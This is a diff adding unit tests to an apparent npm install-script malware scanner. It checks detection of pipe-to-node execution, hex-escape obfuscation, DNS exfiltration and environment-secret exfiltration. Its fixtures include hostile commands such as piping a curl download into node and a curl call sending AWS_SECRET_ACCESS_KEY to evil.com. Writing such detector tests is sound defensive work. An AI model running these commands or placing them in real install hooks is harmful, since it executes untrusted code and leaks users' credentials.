@@ -100,6 +100,64 @@ describe("scanPackage — synthetic single-token fixtures", () => {
     );
     expect(networkFindings.length).toBe(1);
   });
+
+  it("does NOT flag || node as pipe_exec (logical OR false positive)", () => {
+    const scripts = { postinstall: "prebuild-install -r napi || node-gyp rebuild" };
+    const { findings } = scanPackage(scripts, emptyFileMap, "low");
+    expect(findings.some((f) => f.category === "pipe_exec")).toBe(false);
+  });
+
+  it("does flag | node as pipe_exec (actual shell pipe)", () => {
+    const scripts = { postinstall: "curl https://example.com | node" };
+    const { findings } = scanPackage(scripts, emptyFileMap, "low");
+    expect(findings.some((f) => f.category === "pipe_exec")).toBe(true);
+  });
+
+  it("does NOT flag .exec( as dynamic_exec (RegExp method false positive)", () => {
+    const scripts = { postinstall: "node -e 'const m = /foo/.exec(str)'" };
+    const { findings } = scanPackage(scripts, emptyFileMap, "low");
+    // Should not produce a dynamic_exec finding from .exec(
+    const execFromRegexp = findings.filter(
+      (f) => f.category === "dynamic_exec" && f.pattern.trim() === "exec("
+    );
+    expect(execFromRegexp.length).toBe(0);
+  });
+
+  it("detects hex-escape obfuscation (3+ consecutive \\xNN)", () => {
+    const scripts = { postinstall: "node -e '\\x65\\x76\\x61\\x6c(x)'" };
+    const { findings } = scanPackage(scripts, emptyFileMap, "low");
+    expect(findings.some((f) => f.category === "obfuscation")).toBe(true);
+  });
+
+  it("detects dns_exfil (dns.lookup token)", () => {
+    const scripts = { postinstall: "node -e 'require(\"dns\").lookup(h,cb)'" };
+    const { findings } = scanPackage(scripts, emptyFileMap, "low");
+    expect(findings.some((f) => f.category === "dns_exfil")).toBe(true);
+  });
+
+  it("emits env_exfil/critical when env_probe and network co-occur in same hook", () => {
+    // AWS_SECRET_KEY (env_probe) + curl (network) in same postinstall → env_exfil
+    const scripts = { postinstall: "curl https://evil.com/$(echo $AWS_SECRET_ACCESS_KEY)" };
+    const { findings } = scanPackage(scripts, emptyFileMap, "low");
+    const exfil = findings.find((f) => f.category === "env_exfil");
+    expect(exfil).toBeDefined();
+    expect(exfil?.severity).toBe("critical");
+  });
+
+  it("does NOT emit env_exfil when env_probe and network are in different hooks", () => {
+    const scripts = {
+      preinstall: "curl https://example.com",
+      postinstall: "echo $AWS_SECRET_ACCESS_KEY",
+    };
+    const { findings } = scanPackage(scripts, emptyFileMap, "low");
+    expect(findings.some((f) => f.category === "env_exfil")).toBe(false);
+  });
+
+  it("does NOT flag require(path.join()) as dynamic_require", () => {
+    const scripts = { postinstall: "node -e 'require(path.join(__dirname, \"x\"))'" };
+    const { findings } = scanPackage(scripts, emptyFileMap, "low");
+    expect(findings.some((f) => f.category === "dynamic_require")).toBe(false);
+  });
 });
 
 describe("PATTERN_REGISTRY integrity", () => {
